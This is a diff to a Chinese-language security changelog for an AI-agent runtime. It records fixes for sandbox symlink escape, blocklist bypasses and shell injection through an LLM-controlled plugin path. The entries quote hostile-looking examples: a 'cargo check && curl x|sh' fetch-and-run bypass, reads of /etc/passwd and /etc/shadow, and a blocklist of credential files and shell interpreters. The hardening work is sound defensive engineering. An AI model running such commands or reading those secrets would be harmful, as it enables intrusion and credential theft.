@@ -2,7 +2,7 @@
 
 ## 1. 判定口径
 
-- 本文基于当前仓库现状整理，最近更新：2026-08-06。
+- 本文基于当前仓库现状整理，最近更新：2026-08-09。
 - 历史规划蓝图已经吸收进 [design-blueprint.md](./design-blueprint.md)，因此本文结论来自三类证据的交叉比对：
   - 设计蓝图：[design-blueprint.md](./design-blueprint.md)
   - 架构文档：[system-overview.md](./system-overview.md)、[contracts-and-loading.md](./contracts-and-loading.md)、[runtime-semantics.md](./runtime-semantics.md)、[maintenance-guide.md](./maintenance-guide.md)
@@ -219,8 +219,8 @@ Agent 现在可以自主完成：读代码 → 理解结构 → 写/改文件 �
 - [x] **命令注入**（P0-1）— `bash -lc` 被换成 `shell_words::split` + `Command::new(argv[0])`；`;`、``` ` ```、`$(...)`、重定向等 shell 元字符不再被解释为语法。`kernel/verifier.rs::run_shell_command`。
 - [x] **命令超时**（P0-1）— 每条 verifier 命令有 10 分钟默认 wall-clock 超时；到点 kill + wait。防止恶意 `sleep infinity` 或死锁 `cargo test` 卡住 iteration 管道。
 - [x] **无命令等于 rubber-stamp**（P0-2）— 全部 stage 均 `Skipped` 时 `tests_passed = false` 且 `quality_score = 0`。至少要有一个 stage 真的 execute 才可能 Pass。
-- [x] **Verify/Promote TOCTOU**（P0-3）— `VerificationReport.source_tree_hash` 记录 verify 时的 sha256；`finalize_plugin_iteration` 在 `promote_candidate` 前重算并比对，不匹配则强制 rollback。
-- [x] **Plugin verifier 目标错位**（P0-4）— `verify_plugin_iteration` 传入 `VerifyOptions::candidate_invoker`，`plugin:` 命令走 staged candidate snapshot 而非 live registry。
+- [x] **Verify/Promote TOCTOU**（P0-3）— `VerificationReport.source_tree_hash` 记录 verify 时的 sha256；`finalize_plugin_iteration` 在 `promote_candidate` 前重算并比对，不匹配则强制 rollback。基线哈希本身失败（不可读文件 / 悬空符号链接 / 权限不足）不再被 `.ok()` 静默吞掉：`VerificationReport.hash_error` 记录失败原因，`detect_plugin_source_drift` 据此把 `Pass` 降级为 rollback（与 promote 前 rehash 失败同等待遇，2026-08-09 补）。
+- [x] **Plugin verifier 目标错位**（P0-4）— `verify_plugin_iteration` 传入 `VerifyOptions::candidate_invoker`，`plugin:` 命令走 staged candidate snapshot 而非 live registry；`plugin:` 命令缺失 `candidate_invoker` 时直接返回 `InvalidArgument`（"verification requires a candidate plugin invoker when plugin: commands are present"），不再回退加载 live `PluginInvoker`（2026-08-09 补）。
 
 ### 5.2.5 Web/SSRF/Session 硬化（2026-07-17 已闭合）
 
@@ -238,6 +238,12 @@ Agent 现在可以自主完成：读代码 → 理解结构 → 写/改文件 �
 - [x] **Filesystem / Git 白名单不再静默降级**（P0-19）— `canonicalize` 失败时不再退回未规范化路径。新增 `canonicalise_for_whitelist` / `validate_path_in_root` 的深度 ancestor 解析：路径不存在时 canonicalize 最深的存在祖先再拼 tail；两侧都失败则 fail-closed。`../../etc/shadow` 之类的构造再无绕过。
 - [x] **Plugin iteration symlink 逃逸**（P0-20）— `PluginEditExecutor::execute` 在写入前调用新 helper `resolve_under_workspace`：canonicalize 结果必须仍在 workspace_root 下。plugins 内的 symlink 指向 `/etc/passwd` 之类无法被写入。
 - [x] **Verifier shell 拼接**（P0-21）— 已随 A 批 P0-1 修复。`discover_rust_workspace_manifest` 输出的字符串被 `shell_words` 解析成 argv，空格 / `$` / `;` 无法被解释。
+
+### 5.2.41 host.rs 三处安全硬化（2026-08-09 已闭合）
+
+- [x] **`resolve_sandboxed_path` 悬空 symlink 逃逸** — 原实现只对"最近已存在祖先"做 canonicalize 校验，最终分量若是悬空 symlink（目标不存在或指向 root 外）即放行，调用方 `fs::write` 会跟随链接在沙箱外创建/覆写文件。现在：最终分量存在时对完整 resolved 路径 canonicalize 校验包含性；最终分量是 symlink 时解析其目标（read_link + canonicalize，相对目标按链接父目录拼接）并要求目标在 root 内；悬空链接直接拒绝（`path is a dangling symlink: <rel>`）。指向 root 内的 symlink 仍允许（原有语义）。`crates/cordis-runtime/src/host.rs::resolve_sandboxed_path`。回归测试见 `tests/host_boot_session_arms.rs`（dangling-abs / dangling-rel / inside-link / inside-abs / ext-link）。
+- [x] **敏感路径/命令子串黑名单绕过** — 原 `lower.contains(kw)` 子串匹配被 `/etc//passwd`、`/proc//self`、`apikey` / `api-key` 等变体绕过。`check_sensitive_path` 先做纯词法路径规范化（折叠重复 `/`、去尾部 `/`、词法解析 `.`/`..`，不做 fs 操作），再按组件链匹配 `etc/passwd`、`etc/shadow`，按根级组件边界匹配 `proc`/`sys`，按组件前缀匹配 `.ssh`/`.env`/`id_rsa`/`credentials`/`auth.json` 等，并对 `access_token`/`api_key`/`api_secret`/`private_key` 做 `-`、` ` → `_` 归一化（含去下划线紧凑形，拦截 `api-key`/`apikey` 变体）；归一化只作用于这些关键词，`plugins/x/api-utils.rs` 不误伤。`check_sensitive_command` 保留原始子串检查，另加 argv token 级路径门（shell_words 分词，形如路径的 token 跑敏感路径匹配，拦 `head /etc/passwd`、`cat /etc//shadow`、`~/.ssh/` 访问）与 shell 解释器拦截（argv[0] ∈ {sh,bash,dash,ksh,zsh,fish} 且含 `-c`/`-lc`/`--command` → `blocked: shell interpreter invocation`）。
+- [x] **Plugin-iteration 验证命令去 shell**（对齐 P0-17）— `validated_verification_command` 的 `trimmed.starts_with(required_prefix)` 前缀白名单可被 `cargo check && curl x|sh` 绕过，默认命令 `format!("… -p {pp}")` 把 LLM 可控的 plugin_path 拼进 `bash -lc` 字符串。现在：新增共享 argv 门 `validate_verification_argv`（`shell_words::split` 分词、`argv[0]=="cargo"`、`argv[1]` 为所需 op、任何 argv 元素含 `; & | \` $ < > 换行` 即拒），`run_checked_command` 不再经 shell，直接 `Command::new("cargo").args(...)`；默认命令改为 argv 构造 `verification_default_command`，plugin_path 经 `verification_package_segment` 校验（剥离前缀 `/`、拒绝空、拒绝白名单外字符与 `..`，失败返回 InvalidArgument）后作为独立 `["-p", pp]` argv 元素追加；裸别名 `check`/`test` 仍映射到默认 argv。错误文本保持逐字节兼容（`verification tool only allows commands starting with …`）。
 
 ### 5.2.40 插件工件体积：exclude 清单里的插件收不到 strip profile（2026-08-06）
 
